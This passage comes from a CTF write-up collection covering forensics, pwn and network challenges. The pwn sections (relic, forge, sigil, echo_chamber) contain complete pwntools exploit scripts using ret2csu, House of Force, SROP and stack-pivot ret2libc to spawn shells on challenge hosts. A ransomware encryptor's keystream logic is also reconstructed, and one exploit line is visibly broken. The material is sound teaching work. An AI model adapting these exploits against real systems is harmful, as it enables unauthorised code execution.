| --- | --- | --- |
| Q3 nonce | 29 | Controller's nonce ≠ what the gateway logged and committed |
| Q3 revision | 28 | Controller answered with a different route-map revision |
| Q4 readback | 24 | Controller readback shows a different register (`9xxx`) than the one requested |
| Q4 READBACK_OBSERVED | 31 | Gateway's logged readback disagrees with its own ledger row |

**16 cycles qualify**: gateway_seq 14, 15, 34, 35, 55, 69, 78, 79, 80, 83, 85, 87, 95, 103, 110, 117.

**Screenshot 4:** solver summary (WAL vs main-DB rows, failure categories, qualifying seqs) + a few example failures
```bash
cd ~/dawn
grep -E "^\[" witness_out.txt
grep FAIL witness_out.txt | head -4
```

**Screenshot 5:** one qualifying cycle traced in the syslog (all 4 phases in order, matching values)
```bash
cd ~/dawn
grep 'gateway_seq="14"' vol/var/log/rrca/dispatch-gateway.syslog
```

#### 6. Witness

The witness file is 1733 bytes: the 21-byte header plus 16 lines, each ending in a single LF (`cat -A` shows `$` with no `^M`).

**Screenshot 6 (final):** witness format check + hash + flag
![2026-11-06_161039.png](images/2026-11-06_161039.png)

```bash
cd ~/dawn
cat -A witness.txt | head -5
sha256sum witness.txt
tail -1 witness_out.txt
```

**Flag:** `CSCTF{dawn_12d6b2bf2703a884e970e2c4d0070c894c8cf53be91d44feabeb44e18c02eefb}`

#### Takeaways

- Real md arrays keep a superblock on every member. Read the geometry (layout, chunk, data offset, role) from it instead of guessing, and rebuild one missing RAID-5 member by XOR.
- `debugfs` / `rdump` extract ext4 contents with no mount and no root.
- **Never open SQLite evidence in place** when a WAL is present: work on a copy. Here a quarter of the ledger existed only in the WAL.
- A local “committed” record is not proof the remote side acknowledged it. Cross-check every claim against independent sources (controller traffic + logs).
- Hash-based witnesses depend on exact bytes: field order, separators, LF endings, no trailing data.

---

### 45. Ghost in the Historian

*Forensics · Medium · 290 pts*

**Flag:** `CSCTF{xorshift_ghost_in_the_historian_d2c19434a637}`

#### Challenge

Ransomware encrypted a substation historian's configuration and deleted the encryptor. We have to recover the original config's `SAFETY_INTERLOCK_TOKEN` without running the malware or mounting the image. Evidence: `evidence.vmdk` (monolithicFlat descriptor) + `evidence-flat.vmdk` (64 MiB raw ext4, label `HISTORIAN01`), `README_FOR_RESPONDERS.md`, `manifest.sha256`.

README hint: the filesystem was built on **29 Oct**, but incident records and access/modification times represent **2 Oct**. “Treat those different clocks according to what each records.”

#### 1. Identify the image and list files

A *flat* VMDK is a plain raw disk; the descriptor just points at it (`RW 131072 FLAT "evidence-flat.vmdk" 0`). So Sleuth Kit reads it directly.

**Screenshot 1:** descriptor, integrity check, file listing incl. deleted inodes
```bash
cd ~/ghost
cat evidence.vmdk; sha256sum -c manifest.sha256
fls -r -p evidence-flat.vmdk
```

Findings: three encrypted files in `/var/historian` (inodes 22, 23, 28; `grid_topology.cfg.enc` is 235 B) and three deleted orphan inodes. **Inode 27 has mode `rwxr-xr-x`** (executable) and was deleted together with a change to `/tmp`: that's the encryptor.

#### 2. Read the logs and timeline (two clocks)

**Screenshot 2:** historian.log (PID + time) and the 2 Oct mtimes of the .enc files
```bash
cd ~/ghost
icat evidence-flat.vmdk 25
fls -r -m / evidence-flat.vmdk > body.txt && mactime -b body.txt -d -z UTC | grep -E "Date|\.enc"
```

- `historian.log`: `2026-10-02 04:13 historian_enc[<b>2764964</b>]: starting encryption sweep, target_dir=/var/historian`
- `.enc` files: **mtime/atime = 2026-10-02 04:13:05 UTC** (ctime/crtime = 29 Oct, the build clock)

#### 3. Recover the deleted encryptor from unallocated space

On ext4, deletion wipes the inode's size and extents (`istat` shows size 0), so `icat` on inode 27 returns nothing. The freed blocks were never overwritten, though. Dumping unallocated space with `blkls` shows the ransom note (a red herring: “this is NOT a decryption key”) and a complete ELF at offset `0x200000`. The ELF header's `e_shoff + e_shnum × e_shentsize` gives its exact size (14,472 B).

Note: zsh treats `!` inside double quotes as history expansion and aborts the command. Run these through `bash`, or `setopt nohistexpand`.

**Screenshot 3:** carve the ELF + ransom note, identify the binary (no execution)
```bash
cd ~/ghost
blkls evidence-flat.vmdk > unalloc.bin
python3 -c "import struct;d=open('unalloc.bin','rb').read();o=d.find(b'\x7fELF');s,=struct.unpack_from('<Q',d,o+0x28);e,n=struct.unpack_from('<HH',d,o+0x3a);open('historian_enc.elf','wb').write(d[o:o+s+e*n]);print(hex(o),s+e*n)"
file historian_enc.elf; strings -n 6 historian_enc.elf | grep -E "historian|%"
```

#### 4. Reverse the encryptor (static)

Imports: `time`, `getpid`, `gmtime_r`, `strftime`, `scandir`, `fread`/`fwrite`, `utime`, `unlink`. No crypto library, and `.rodata` holds only paths and format strings, so the key is computed at run time.

**Screenshot 4:** seed derivation + xorshift32 keystream loop in the disassembly
```bash
cd ~/ghost
objdump -d -M intel --no-show-raw-insn historian_enc.elf > enc_disasm.txt
sed -n '/130a:/,/1347:/p;/1550:/,/15a9:/p' enc_disasm.txt
```

Recovered logic:

```c
t   = time(NULL);  pid = getpid();
state = ((uint32)t == pid) ? 0xA5A5A5A5 : ((uint32)t ^ pid) * 0x9E3779B1;
for each file in scandir(dir, alphabetical by name), skipping dot-files:
    for i in 0, 4, 8, ...:
        state ^= state << 13; state ^= state >> 17; state ^= state << 5;   // xorshift32
        data[i..i+3] ^= little_endian(state);
    write name.enc; utime(name.enc, {t, t}); unlink(name);
// state carries over to the next file
```

The flaw: the key is just `(time, pid)`, and the malware wrote **both** to disk itself. The PID is in its log line, and `utime()` stamped **t** into the `.enc` mtime. That's why the README warns about the clocks: use the 2 Oct mtime, not the 29 Oct ctime.

#### 5. Decrypt offline

t = `2026-10-02 04:13:05 UTC` = `1790914385`, pid = `2764964` → seed `0x40d8e565`. Alphabetical order puts `grid_topology.cfg` first, then `historian_cache.dat`, then `node_status.json`. All three decrypt to clean text, which confirms the key.

**Screenshot 5 (final):** extract the encrypted files and decrypt them
![2026-11-06_162604.png](images/2026-11-06_162604.png)

```bash
cd ~/ghost && mkdir -p dec
icat evidence-flat.vmdk 28 > dec/grid_topology.cfg.enc
icat evidence-flat.vmdk 22 > dec/historian_cache.dat.enc
icat evidence-flat.vmdk 23 > dec/node_status.json.enc
python3 ghost_decrypt.py dec
```

Recovered `grid_topology.cfg`:

```jsx
# Meridian Grid Authority -- Historian Node 07
# Topology Safety Configuration (internal use only)
NODE_ID=MGA-HIST-07
SAFETY_INTERLOCK_TOKEN=CSCTF{xorshift_ghost_in_the_historian_d2c19434a637}
CHECKSUM=pending-resync
```

**Flag:** `CSCTF{xorshift_ghost_in_the_historian_d2c19434a637}`

#### Takeaways

- A deleted binary on ext4 loses its inode extents but often survives in unallocated blocks. Use `blkls` + the ELF header size to carve it exactly.
- Static reversing is enough: imports and the disassembly show the key derivation without running the malware.
- A non-cryptographic PRNG (xorshift32) seeded from `time ^ pid` is recoverable when the malware's own artifacts (log line, `utime` mtime) leak both inputs.
- Know which timestamp records what: here mtime = encryption time (set by the malware), while ctime/crtime = when the image was built.

---

## Pwn

### 46. relic

*Pwn · Medium · 298 pts*

**Flag:** `CSCTF{rASl77En9FhNogFdzRMJRp85}`

#### Challenge

An old control unit that “accepts one deposit and seals itself for good.” One input, then it's done. The brief's riddle maps cleanly to the exploit: *“one deposit”* = a single overflowing `read`; *“work the unit apart from the inside with the few parts it still trusts”* = ROP with the binary's own gadgets + its imported functions; *“bring up a prompt of your own”* = pop a shell.

#### 1. Recon

**Screenshot 1:** protections, imports, and the vulnerable function
```bash
cd ~/relic
checksec relic
# No canary | NX | No PIE (0x400000) | Full RELRO
objdump -d -M intel --no-show-raw-insn relic | sed -n '/<vault>:/,/<main>:/p'
nm -D relic          # imports: read, write, alarm, _exit  (no system, no puts)
```

`vault()` does `read(0, rbp-0x40, 0x120)` into a 64-byte buffer — 288 bytes into 64, so the saved RIP at `rbp+8` is overwritten at offset **72**. No canary, No PIE (gadgets at fixed `0x40xxxx`), but imports are only `read/write/alarm/_exit` — no `system`, and no leak primitive. So: leak libc, then shell. A one-shot `visited` counter `_exit`s on a second entry, so there's exactly one `read`.

#### 2. Gadgets

**Screenshot 2:** the gadgets we have
```bash
ROPgadget --binary relic | grep -E 'pop rdi|pop rsi|: ret|csu'
# 0x4012e3 : pop rdi ; ret
# 0x4012e1 : pop rsi ; pop r15 ; ret
# 0x40101a : ret
# __libc_csu_init: 0x4012da (pop rbx;rbp;r12;r13;r14;r15;ret) + 0x4012c0 (mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8])
```

There's no `pop rdx`, which we need to control `write`'s length for a leak — so we use the classic **`__libc_csu_init`** gadget pair, which loads `rdx/rsi/edi` from `r14/r13/r12` and calls `[r15+rbx*8]`.

#### 3. Plan

The binary is No-PIE, so `write@got`/`read@got` are at fixed addresses. The chain, inside the single 288-byte `read` (72 pad + 216 bytes of ROP):

1. `ret2csu` → `write(1, write@got, 8)` to leak libc (csu sets `rdx=8`).
2. The csu loop's trailing pops reload the registers for `read(0, .bss, 0x200)` and re-enter the call gadget — a **second deposit** from us (`read` is a part it still trusts).
3. `leave; ret` pivots the stack into `.bss` (`0x404500`, inside the mapped RW page).
4. Stage 2 (sent via that second read) = an `execve("/bin/sh", 0, 0)` syscall chain built from the now-known libc.

*Note:* this libc's `system("/bin/sh")` died (its `movaps`/arg handling), so a direct `execve` syscall chain is the robust finish.

#### 4. Exploit

**Screenshot 3:** full working exploit (two-stage ret2csu → execve)
```bash
cd ~/relic
cat > solve.py << 'EOF'
#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'
elf  = ELF('./relic'); libc = ELF('./libc.so.6')

csu_pop   = 0x4012da   # pop rbx;rbp;r12;r13;r14;r15;ret
csu_call  = 0x4012c0   # mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]; ...pops;ret
leave_ret = 0x401218   # leave; ret  (pivot)
write_got = elf.got['write']; read_got = elf.got['read']
STAGE2    = 0x404500   # mapped .bss page
OFF       = 72

chain  = b'A'*OFF
chain += p64(csu_pop)
chain += p64(0)+p64(1)+p64(1)+p64(write_got)+p64(8)+p64(write_got)   # write(1, write@got, 8)
chain += p64(csu_call)
chain += p64(0)                                                     # add rsp,8
chain += p64(0)+p64(1)+p64(0)+p64(STAGE2)+p64(0x200)+p64(read_got)   # trailing pops -> read args
chain += p64(csu_call)                                              # read(0, STAGE2, 0x200)
chain += p64(0)
chain += p64(0)+p64(STAGE2)+p64(0)+p64(0)+p64(0)+p64(0)             # rbp = STAGE2 (pivot)
chain += p64(leave_ret)
assert len(chain) <= 0x120

io = remote('w05.ctf.chronos-security.ro', 33839) if args.REMOTE else process([elf.path])
io.recvuntil(b'vault: ')          # sync past the banners
io.send(chain)                    # the one deposit
io.recv(1)                        # newline written after read()
leak = u64(io.recv(8))            # write@got
libc.address = leak - libc.sym['write']
log.success('libc base = %#x' % libc.address)
assert (libc.address & 0xfff) == 0

binsh = next(libc.search(b'/bin/sh\x00'))
rop = ROP(libc); rop.execve(binsh, 0, 0)          # execve("/bin/sh",0,0)
io.send((p64(0) + rop.chain()).ljust(0x200, b'\x00'))   # stage 2 at STAGE2
io.interactive()
EOF
python3 solve.py REMOTE
```

Then in the shell: `cat flag` (it's at `/flag`).

**Screenshot 4:** shell + flag
![2026-11-08_031640.png](images/2026-11-08_031640.png)

![2026-11-08_031650.png](images/2026-11-08_031650.png)

```
[+] libc base = 0x7d24d8936000
[*] Switching to interactive mode
$ ls
... flag ...
$ cat flag
CSCTF{rASl77En9FhNogFdzRMJRp85}
```

#### Takeaways

- **ret2csu buys you `rdx`.** When the binary has no `pop rdx`, the `__libc_csu_init` gadget pair sets `rdx/rsi/edi` and makes an indirect call — enough to call `write` for a leak and `read` for a second stage.
- **One prompt ≠ one input.** The program reads once, but your ROP can call `read` again to pull in a second stage — then pivot into it. No-PIE makes a fixed `.bss` address a perfect landing pad.
- **Prefer `execve` when `system` is flaky.** A direct `execve` syscall chain avoids `system`'s stack-alignment / argv quirks.

**Flag:** `CSCTF{rASl77En9FhNogFdzRMJRp85}`

---

### 47. orge

*Pwn · Medium · Heap · 385 pts*

**Flag:** `CSCTF{jkOleWmIh1IQ4AVRho1AGdYu}`

#### Challenge

A menu heap allocator (forge / temper / inspect / melt = create / edit / view / free). Source included. Target: `w0X.ctf.chronos-security.ro:PORT` (per-instance). Mitigations: Full RELRO, PIE, canary, NX. Shipped **glibc 2.27-3ubuntu1.6**, and the source header literally says *House of Force*.

#### The bug

`read_until_nl` never NUL-terminates. `temper()` then does:

```c
read_until_nl(p + strlen(p), notes[i].size);   // BUG: should be size - strlen(p)
```

If a chunk is filled completely (no NUL), `strlen(p)` runs to the chunk end, so `temper` writes a full `size` bytes **past** the chunk — a controlled linear heap overflow into the **top chunk**.

#### Exploit plan (House of Force, works on 2.27)

1. **libc leak:** forge a chunk > tcache max (0x500) + a guard, `melt` the big one into the unsorted bin, re-forge it without clobbering `fd`/`bk`, `inspect` → `main_arena+0x60` → libc base.
2. **heap leak:** two 0x50 tcache chunks; 2.27 has no safe-linking, so the second's `fd` is a raw heap pointer → heap base.
3. **overflow:** forge a 0x68 chunk carved from top, fill exactly 0x60 bytes, then `temper` writes `prev_size` + **top size = 0xffffffffffffffff**.
4. **House of Force:** `malloc` a huge forward size so the top pointer walks up to `__free_hook-8`; the next `malloc` returns there and we write `system`.
5. **fire:** pre-staged `/bin/sh` chunk → `melt` it → `free` calls `__free_hook("/bin/sh") = system("/bin/sh")` → shell.

House of Force survives on 2.27 because the `PTRDIFF_MAX` / `system_mem` top-size checks only arrived in 2.29. `__free_hook` sits above the heap, so the forward walk stays within range.

#### Key offsets / values (this libc)

- `main_arena` = libc + 0x3ebc40, lone-unsorted fd = `main_arena+0x60`
- `__free_hook` = libc + 0x3ed8e8 · `system` = libc + 0x4f420
- `main_arena.top` at `main_arena+0x60`; for this alloc sequence `top = heap_base + 0x8b0`

#### Verification (local, with shipped libc/ld)

The exploit computes libc base, heap base and the HoF distance **live from the leaks**, so a per-instance relaunch doesn't change it. Built and tested locally against `./forge` with the shipped loader: the overflow sets top size to `-1`, the huge malloc walks top to `__free_hook-0x18`, the next malloc writes `system` into `__free_hook`, and the final free pops a shell.

**Screenshot 1:** checksec + the `temper` off-by-one in forge.c
```bash
cd ~/forge
checksec --file=forge
grep -n -A2 "more content" forge.c
```

**Screenshot 2 (final):** run the exploit against the live instance and read the flag
```bash
cd ~/forge
python3 forge_exploit.py w0X.ctf.chronos-security.ro:PORT
# in the shell: cat flag
```

Result: `uid=10001(ctf)` shell → `cat flag` → `CSCTF{jkOleWmIh1IQ4AVRho1AGdYu}`

**Flag:** `CSCTF{jkOleWmIh1IQ4AVRho1AGdYu}`

#### Takeaways

- A missing NUL terminator + `strlen`-based write offset is a classic linear heap overflow into the top chunk.
- **House of Force**: overwrite the top chunk size with `-1`, then one oversized `malloc` moves the allocation pointer anywhere forward of the heap. Dead on glibc ≥ 2.29, alive on 2.27.
- On 2.27, tcache has no safe-linking, so a freed chunk's `fd` leaks raw heap pointers directly.
- Compute every address from runtime leaks so the exploit is ASLR- and instance-independent.
- **Defense:** upgrade glibc (≥ 2.29 kills HoF and adds tcache hardening), and never size a write as `total` when the position is already `strlen` in.

---

### 48. sigil

*Pwn · Hard · SROP · 558 pts*

**Flag:** `CSCTF{5GVl85DFVC2dxGZkI1EBZG4x}`

#### Challenge

A tiny **statically-linked** x86-64 ELF with **no libc** — just a hand-rolled `sys3()` syscall wrapper. `listen()` prints `speak the sigil:` then does `read(0, buf, 0x400)` into a **0x40-byte** stack buffer → stack overflow. No canary, No PIE (0x400000), NX. The banner says it: *"the kernel remembers every frame you show it"* → **SROP**.

#### Recon

**Screenshot 1:** static / NX / No-PIE / no-canary + the syscall & rax gadgets
```bash
cd ~/sigil && tar xvf sigil.tar.gz
file sigil
checksec --file=sigil
readelf -l sigil
ROPgadget --binary sigil | grep -E 'syscall|mov eax'
objdump -d -M intel sigil | head -150
```

Gadgets / addresses:

- `0x401024` — `syscall` (epilogue: `pop rbp ; ret`)
- `0x40102b` — `mov eax,[rbp-8] ; pop rbp ; ret`
- `0x401030` — `listen` (loop target)
- `0x404000` — `attempts` counter (++ every call)
- Overflow offset to saved RIP = **0x48**

#### rax=15 without a `pop rax`

`rt_sigreturn` is syscall **15**. There is no `pop rax`, but `attempts` at `0x404000` increments on every `listen()` entry. Loop `listen` **15 times** (the "right sequence"), then set `rbp=0x404008` so `mov eax,[rbp-8]` loads `[0x404000]=15` → `syscall` = sigreturn.

#### Exploit — two sigreturn frames

No `/bin/sh` string in the binary, so chain two frames:

1. **Frame 1:** `read(0, 0x404200, 0x200)` — drop `"/bin/sh\0"` + a glue chain into the writable .bss page.
2. Glue re-loads `eax=15` (attempts untouched) → `syscall` → **Frame 2:** `execve("/bin/sh", 0, 0)` → shell.

**Screenshot 2:** running the SROP exploit and landing the shell
```bash
cd ~/sigil
python3 exploit.py w01.ctf.chronos-security.ro:PORT
```

**Screenshot 3:** shell + flag
![2026-11-06_231343.png](images/2026-11-06_231343.png)

```bash
cat /tmp/flag
```

Exploit (pwntools):

```python
from pwn import *
context.clear(arch='amd64')
SYSCALL=0x401024; MOVRAX=0x40102b; LISTEN=0x401030
BSS=0x404200; GLUE=BSS+0x10; SCRATCH=0x404f00
f1=SigreturnFrame(); f1.rax=0; f1.rdi=0; f1.rsi=BSS; f1.rdx=0x200
f1.rbp=SCRATCH; f1.rip=SYSCALL; f1.rsp=GLUE
f2=SigreturnFrame(); f2.rax=59; f2.rdi=BSS; f2.rsi=0; f2.rdx=0
f2.rbp=SCRATCH; f2.rip=SYSCALL; f2.rsp=SCRATCH
blob=b"/bin/sh\0"+b"JUNKJUNK"+p64(0x404008)+p64(MOVRAX)+p64(SCRATCH)+p64(SYSCALL)+bytes(f2)
pad=b"A"*0x40
loop=pad+p64(SCRATCH)+p64(LISTEN)
trig=pad+p64(0x404008)+p64(MOVRAX)+p64(SCRATCH)+p64(SYSCALL)+bytes(f1)
io=remote("w01.ctf.chronos-security.ro",PORT)
for _ in range(14): io.recvuntil(b"speak the sigil: "); io.send(loop)
io.recvuntil(b"speak the sigil: "); io.send(trig); io.send(blob)
io.interactive()
```

#### Takeaways

- **SROP** turns one `syscall` gadget + a stack write into full register control — no libc, no pop-chain needed.
- Thematic rax source: a persistent counter made to equal **15** (the sigreturn number) by replaying input the right number of times.
- No `/bin/sh`? Frame 1 `read`s it into a known .bss address, Frame 2 `execve`s it.
- **Defense:** never `read` more than the buffer size; a stack canary alone stops this.

**Flag:** `CSCTF{5GVl85DFVC2dxGZkI1EBZG4x}`

---

### 49. echo_chamber

*Pwn · Hard · ret2libc · 609 pts*

**Flag:** `CSCTF{GT8a3mUNrUGKEpD6qSKMY5Yc}`

#### Challenge

A PIE x86-64 echo service (source shipped). `chamber()` loops: `printf("> ")`, `read(0, buf, 0x70)` into a **0x50**-byte buffer, breaks on `"bye"`, else `printf("echo: %s\n", buf)`. Mitigations: **Full RELRO + canary + PIE + NX**; **glibc 2.35** shipped.

#### Two bugs

- **Overflow:** buffer is `0x50` but `read` takes `0x70` → overwrites canary (off `0x58`), saved rbp (`0x60`), return (`0x68`). But `0x70` reaches **exactly** the end of the return → only **one qword** of control, no room for a ROP chain.
- **Leak:** `printf("echo: %s")` on a **non-NUL-terminated** buffer → prints past your input into adjacent stack.

#### Recon

**Screenshot 1:** protections + shipped libc + source
```bash
cd ~/echo_chamber && tar xvf echo_chamber.tar.gz
file echo_chamber
checksec --file=echo_chamber
cat echo_chamber.c
strings libc.so.6 | grep -i 'glibc 2\.'
```

**Screenshot 2:** the binary has **no** `pop rdi` (only `leave;ret`, `pop rbp;ret`, `ret`); libc does
```bash
ROPgadget --binary echo_chamber | grep -E 'pop rdi ; ret$|pop rbp ; ret$|leave ; ret$|: ret$'
ROPgadget --binary libc.so.6 | grep -E 'pop rdi ; ret$' | head -1
```

#### Leak chain (non-NUL %s)

Send filler with **no NUL** so `%s` runs into the next stack slot:

- **canary:** `0x58` filler + 1 byte (clobber canary LSB) → echo returns `canary[1:8]`.
- **stack (rbp):** fill `0x60` → echo returns saved `rbp` (*do this before the PIE leak — the PIE round overwrites this slot*).
- **PIE:** fill `0x68` → echo returns the saved return → image base = leak − `0x137e`.

#### No `pop rdi`? Pivot `rbp` to leak libc

The loop reads/echoes through `rbp-0x60`, and we **control rbp**. Break with `"bye"`, set saved rbp = `main_rbp+0x60`, return = loop body (`0x12e9`). The loop now operates on `buf' = main_rbp`; send 8 bytes and `%s` leaks the saved `__libc_start_call_main` at `main_rbp+8` → **libc base** (pwntools `libc_start_main_return`). Then break again and pivot (`leave;ret`) into `buf'` holding `pop rdi ; "/bin/sh" ; ret ; system` → shell.

**Screenshot 3:** exploit prints each leak, then shell + flag
![2026-11-06_233804.png](images/2026-11-06_233804.png)

![2026-11-06_234013.png](images/2026-11-06_234013.png)

![2026-11-06_234024.png](images/2026-11-06_234024.png)

![2026-11-06_234036.png](images/2026-11-06_234036.png)

```bash
cd ~/echo_chamber
python3 exploit.py w01.ctf.chronos-security.ro:PORT
# then in the shell:
cat /flag
```

Exploit (pwntools):

```python
from pwn import *
context.clear(arch='amd64')
elf=ELF('./echo_chamber',checksec=False); libc=ELF('./libc.so.6',checksec=False)
LEAVE=0x1365; RET=0x101a; LOOP=0x12e9; RET_MAIN=0x137e; POP_RDI=0x2a3e5
io=remote("w01.ctf.chronos-security.ro",PORT)
def echo(p): io.recvuntil(b'> '); io.send(p); io.recvuntil(b'echo: '); return io.recvuntil(b'\n',drop=True)
d=echo(b'A'*0x58+b'B'); canary=u64(b'\x00'+d[0x59:0x59+7])
d=echo(b'A'*0x60); main_rbp=u64(d[0x60:0x60+6].ljust(8,b'\x00'))
d=echo(b'A'*0x68); base=u64(d[0x68:0x68+6].ljust(8,b'\x00'))-RET_MAIN; elf.address=base
leave=base+LEAVE; ret=base+RET; loop=base+LOOP
T=main_rbp+0x60
io.recvuntil(b'> '); io.send((b'bye\x00'+b'A'*0x54)+p64(canary)+p64(T)+p64(loop))
io.recvuntil(b'> '); io.send(b'A'*8); io.recvuntil(b'echo: ')
lscm=u64(io.recvuntil(b'\n',drop=True)[8:8+6].ljust(8,b'\x00'))
libc.address=lscm-libc.libc_start_main_return
chain=p64(base+POP_RDI... )  # use libc pop rdi: p64(libc.address+POP_RDI)+p64(next(libc.search(b'/bin/sh')))+p64(ret)+p64(libc.sym['system'])
pay=b'bye\x00'.ljust(8,b'\x00')+chain; pay=pay.ljust(0x58,b'A')+p64(canary)+p64(main_rbp)+p64(leave)
io.recvuntil(b'> '); io.send(pay); io.interactive()
```

#### Takeaways

- A `read` that is only *slightly* too big (one qword past the return) still wins via a **stack pivot** — `leave;ret` + a controlled saved rbp redirect `rsp` into your buffer.
- **No `pop rdi` in the binary?** If the vuln function indexes its buffer off `rbp`, pivot `rbp` and re-enter the loop to place the buffer over a libc pointer — leak with the program's own `%s`.
- A non-NUL-terminated `%s` is a full canary/PIE/libc oracle.
- **Defense:** bound `read` to the buffer size and always NUL-terminate before formatting.

**Flag:** `CSCTF{GT8a3mUNrUGKEpD6qSKMY5Yc}`

---

## Network

### 50. Water Hammer Reconciliation

*Network · Medium · 390 pts*

**Flag:** `CSCTF{L3LBJQQRIXYIBUFDABBXKLH2EEHWDIUZAM2R3XQ}`

#### Challenge

Reconstruct the confirmed Modbus/TCP control history of the Vardessa water-reserve header from a capture, apply the station profile's **matched-readback** confirmation rule + integer **safety screen**, serialize a canonical report, and encode it into the submission string. Three files: `reserve-header.pcapng`, `station-profile.txt` (all the rules), `capture-manifest.txt` (provenance).

#### Recon — read the rules, decode the traffic

`unzip -o water-hammer-reconciliation.zip -d .`
`cat station-profile.txt capture-manifest.txt`
`tshark -r reserve-header.pcapng -q -z conv,tcp`
`tshark -r reserve-header.pcapng -Y 'modbus || mbtcp' -T fields -E separator='|' -E header=y -e frame.number -e ip.src -e ip.dst -e mbtcp.trans_id -e mbtcp.unit_id -e mbtcp.len -e modbus.func_code -e modbus.exception_code -e modbus.reference_num -e modbus.word_cnt -e modbus.byte_cnt -e modbus.regval_uint16`
- Scope: `192.0.2.10 ↔ 192.0.2.20:502`, unit id **17**. Registers `0x1000 PUMP_TARGET`, `0x1001 GATE`, `0x1002 ARMED`, `0x1003 RAMP_US`.

#### The matched-readback rule (what counts as a confirmed snapshot)

A write-ack alone is **not** a confirmed control snapshot. A snapshot counts only when all four hold, in order:

- An **FC16** write (client → server) of quantity 4 starting at `0x1000`.
- Its **normal FC16 response** (same transaction id, no exception).
- The **immediately next** client ADU is **FC3** `03 || 1000 || 0004`.
- Its FC3 response **echoes the same 4 register values**.

Row `tid` = the **FC16-response** transaction id (never the FC3 readback's). These run `0x2000, 0x2011, …` (+0x11) for the **64** snapshots, ending `0x242F`.

**Decoys the profile plants (all discarded):** the initial reads `(80,500,0,60000)`; one **FC16 exception** (frame 13); two trailing harmless FC3 reads (frames 526–529); one final **unpaired** FC16 write (frame 531).

#### Safety screen + canonical report

`T_US=37558`. Per row: `E=⌊P·G/1000⌋`, `V=⌊E·1e6/70686⌋`, `Q=998·1065·|V−V_prev|`, with `V_-1` from the initial P,G (=565). `UNSAFE=1 iff ARMED=1 ∧ RAMP_US<37558 ∧ Q>900000000`. **Q exceeds 32-bit — use 64-bit integers.** 22 rows unsafe → `unsafe-mask=D3FC7C00A3060000`.

The solver parses the pcap, reconstructs the 64 snapshots by the rule above, runs the screen, builds the report `R`, then SHA-256 → first 24 raw bytes → RFC 4648 Base32 (A–Z2–7, no padding) = 39 chars. It self-verifies against the profile's published synthetic vector first.

```python
import subprocess, hashlib, base64
P="reserve-header.pcapng"; CLIENT="192.0.2.10"
F=["ip.src","mbtcp.trans_id","modbus.func_code","modbus.exception_code",
   "modbus.reference_num","modbus.word_cnt","modbus.regval_uint16"]
raw=subprocess.run(["tshark","-r",P,"-Y","modbus||mbtcp","-T","fields","-E","separator=~"]
     +sum([["-e",f] for f in F],[]),capture_output=True,text=True).stdout
rows=[r.split("~") for r in raw.strip().splitlines()]
conf=[]; i=0
while i<len(rows):
    src,tid,fc,exc,ref,wc,regs=rows[i]
    if fc=="16" and src==CLIENT and wc=="4" and ref=="4096" and regs and i+3<len(rows):
        vals=[int(x) for x in regs.split(",")]
        s2,t2,f2,e2,*_=rows[i+1]                      # FC16 normal response
        s3,t3,f3,e3,r3,w3,_=rows[i+2]                 # next client ADU = FC3 readback
        s4,t4,f4,e4,r4,w4,g4=rows[i+3]                # FC3 response echo
        if (f2=="16" and s2!=CLIENT and t2==tid and e2=="" and
            f3=="3" and s3==CLIENT and r3=="4096" and w3=="4" and
            f4=="3" and s4!=CLIENT and t4==t3 and e4=="" and
            [int(x) for x in g4.split(",")]==vals):
            conf.append((int(tid),vals)); i+=4; continue
    i+=1
assert len(conf)==64, len(conf)
P0,G0,A0,R0=80,500,0,60000; T=37558
Vp=((P0*G0//1000)*1000000)//70686
lines=["water-hammer-reconciliation-v2",f"initial;p={P0};g={G0};a={A0};r={R0}","n=64"]; M=0
for i,(tid,(p,g,a,r)) in enumerate(conf):
    E=p*g//1000; V=E*1000000//70686; Q=998*1065*abs(V-Vp)
    if a==1 and r<T and Q>900000000: M|=1<<(63-i)
    Vp=V; lines.append(f"i={i};tid={tid:04X};p={p};g={g};a={a};r={r}")
lines.append(f"unsafe-mask={M:016X}")
R="\n".join(lines).encode()
b32=base64.b32encode(hashlib.sha256(R).digest()[:24]).decode().rstrip("=")
print("CSCTF{"+b32+"}")
```

#### Takeaways

- **A write-ack is not ground truth:** in ICS forensics an unanswered or merely-acknowledged write proves intent, not state — only a readback that echoes the value confirms the control snapshot.
- **Follow the grammar literally:** the report's byte-exact formatting (LF, no trailing newline, shortest decimals, FC16-response tid in 4-hex) is part of the hash — a published synthetic vector lets you validate the whole pipeline before trusting the real run.
- **Watch integer width:** Q reaches ~2.4e9, outside signed 32-bit — 64-bit arithmetic is mandatory.

**Flag:** `CSCTF{L3LBJQQRIXYIBUFDABBXKLH2EEHWDIUZAM2R3XQ}`

---

### 51. Dark Anchorage Reconciliation

*Network · Medium · 409 pts*

**Flag:** `CSCTF{JkQ0RIqjOsdh5zZ2GUHOlGbx}` (per-instance code returned by `POST /reconcile`)

#### Challenge

The KALNET-1 cable failed while a hostile maritime operation was expected nearby. AIS says no suspicious vessel crossed the fault envelope, but coastal radar logged anonymous contacts on a different clock. We have to send a sensor-reconciliation report that identifies the false AIS broadcast, quantifies its displacement and gives the actual closest approach. Live instance: `GET /schema`, `GET /files/{ais.ndjson, radar.csv, cable-fault.txt, method-note.txt}`, `POST /reconcile`.

The instance lasts 30 min and relaunching generates a new case. Set `T` to your current instance URL before running the screenshot commands.

#### 1. Download the spec and evidence

**Screenshot 1:** schema + method note + cable fault + evidence heads
```bash
mkdir -p ~/anchorage && cd ~/anchorage
T=http://w03.ctf.chronos-security.ro:33483
for p in schema files/ais.ndjson files/radar.csv files/cable-fault.txt files/method-note.txt; do curl -s "$T/$p" -o "$(basename $p)"; done
cat schema | python3 -m json.tool | head -60
cat method-note.txt cable-fault.txt
head -6 radar.csv; sed -n '1p;20p' ais.ndjson
```

What the evidence says:

- **Cable fault:** origin `50.13287321, 19.85375572`, fault 10:18–10:32 UTC.
- **Radar:** header `radar_utc_offset_minutes=60`. `local_time` = UTC + offset (the trailing `Z` is misleading), so UTC = local − 60 min.
- **AIS:** NDJSON with metadata, static and position records (`mmsi`, `utc`, `lat`, `lon`), 120 s cadence, 16 identities.
- **Method:** a local tangent plane at the cable point: `east = R·cos(lat0)·Δlon`, `north = R·Δlat` (R = 6378137, radians). The plane, not an ellipsoidal result, is the report metric.

#### 2. Associate radar tracks with AIS identities

